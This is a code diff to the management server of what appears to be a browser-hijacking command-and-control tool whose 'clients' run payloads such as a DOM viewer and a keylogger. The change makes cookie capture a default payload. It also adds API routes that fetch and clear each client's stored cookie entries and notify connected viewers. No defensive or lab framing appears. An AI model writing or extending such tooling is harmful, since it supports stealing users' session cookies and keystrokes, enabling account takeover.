@@ -130,7 +130,7 @@ export function createManagementServer(state, opts = {}) {
     const rawPayloads = req.body.payloads;
     const payloads = rawPayloads !== undefined
       ? rawPayloads.filter((p) => payloadHandlers[p])
-      : ["domviewer"];
+      : ["domviewer", "cookies"];
     if (rawPayloads?.length > 0 && payloads.length === 0) {
       res.status(400).json({ error: "No valid payloads specified" });
       return;
@@ -503,6 +503,26 @@ export function createManagementServer(state, opts = {}) {
     const active = activeClients.get(req.params.id);
     if (active?.payloads?.keylogger?.viewers) {
       broadcast(active.payloads.keylogger.viewers, JSON.stringify({ type: "cleared" }));
+    }
+    res.json({ ok: true });
+  });
+
+  // ---------- Cookies Routes ----------
+
+  /** GET /api/clients/:id/cookies/entries — Fetch all persisted cookie entries as JSON. */
+  app.get("/api/clients/:id/cookies/entries", requireClient(db), (req, res) => {
+    res.json(db.getCookieEntries(req.params.id));
+  });
+
+  /**
+   * POST /api/clients/:id/cookies/clear — Delete all entries and notify connected viewers.
+   */
+  app.post("/api/clients/:id/cookies/clear", requireClient(db), (req, res) => {
+    db.clearCookieEntries(req.params.id);
+    // Notify any connected viewers so they can clear their local state
+    const active = activeClients.get(req.params.id);
+    if (active?.payloads?.cookies?.viewers) {
+      broadcast(active.payloads.cookies.viewers, JSON.stringify({ type: "cleared" }));
     }
     res.json({ ok: true });
   });
